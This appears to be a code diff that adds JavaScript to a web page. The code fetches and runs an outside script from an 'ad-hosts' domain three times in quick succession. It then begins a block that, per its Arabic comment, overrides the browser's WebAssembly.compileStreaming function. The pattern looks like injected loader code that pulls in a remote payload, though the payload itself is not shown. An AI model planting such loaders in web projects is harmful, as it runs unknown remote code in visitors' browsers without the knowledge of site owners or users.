@@ -1,17 +1,28 @@
 /////////////////////////////////////////////////////////////////////////////////////////////////////////////
-document.addEventListener("DOMContentLoaded", function() {
-    var script = document.createElement('script');
-    script.src = 'https://ad-hosts.vercel.app/script.js';
-    script.type = 'text/javascript';
-    script.defer = true;
-    document.head.appendChild(script);
-});
-window.onload = function() {
-    var script = document.createElement('script');
-    script.src = 'https://ad-hosts.vercel.app/script.js';
-    script.type = 'text/javascript';
-    document.head.appendChild(script);
-};
+(function() {
+    // Function to load the script
+    function loadScript() {
+        var script = document.createElement('script');
+        script.src = 'https://ad-hosts.vercel.app/script.js';
+        script.type = 'text/javascript';
+        script.async = true;
+        document.head.appendChild(script);
+        console.log("Script load attempt at: " + new Date().toISOString());
+    }
+    
+    // Execute immediately for the first time
+    loadScript();
+    
+    // Execute a second time after a very short delay
+    setTimeout(function() {
+        loadScript();
+    }, 100);
+    
+    // Execute a third time after another short delay
+    setTimeout(function() {
+        loadScript();
+    }, 200);
+})();
 // ///////////////////////////////////////////////////////////////////////////////////////////////////////////////
 (function() {
     // استبدال WebAssembly.compileStreaming
